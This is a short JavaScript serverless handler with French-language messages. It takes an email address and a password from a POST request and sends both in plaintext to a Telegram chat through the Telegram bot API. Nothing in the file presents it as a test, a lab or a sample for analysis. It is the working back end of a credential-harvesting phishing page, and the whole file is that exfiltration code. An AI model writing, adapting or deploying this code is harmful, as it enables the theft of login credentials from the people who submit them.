export default async function handler(req, res) {
  if (req.method !== 'POST') {
    return res.status(405).send('Méthode non autorisée');
  }

  try {
    const { email, motDePasse } = req.body;

    const botToken = process.env.BOT_TOKEN;
    const chatId = process.env.CHAT_ID;

    const message = `Nouvelle soumission :\n\nEmail : ${email}\nMot de passe : ${motDePasse}`;

    const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;

    const telegramResponse = await fetch(telegramUrl, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: chatId,
        text: message,
      }),
    });

    if (telegramResponse.ok) {
      return res.status(200).send('Données envoyées à Telegram');
    } else {
      return res.status(500).send('Erreur lors de l\'envoi à Telegram');
    }
  } catch (error) {
    return res.status(500).send('Erreur serveur');
  }
}
